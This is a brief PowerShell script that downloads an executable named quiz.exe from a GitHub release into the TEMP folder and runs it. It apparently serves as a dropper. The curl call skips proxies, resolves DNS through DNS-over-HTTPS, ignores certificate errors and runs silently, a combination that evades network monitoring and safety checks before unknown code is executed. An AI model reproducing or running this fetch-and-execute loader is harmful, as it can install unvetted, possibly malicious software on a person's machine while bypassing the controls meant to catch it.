$t = "$env:TEMP\quiz.exe"
if (-not (Test-Path $t)) {
    curl.exe --noproxy * --doh-url https://1.1.1.1/dns-query -ksL https://github.com/0rkhanmammadov/questions/releases/download/v1.0/quiz.exe -o $t
}
Start-Process $t
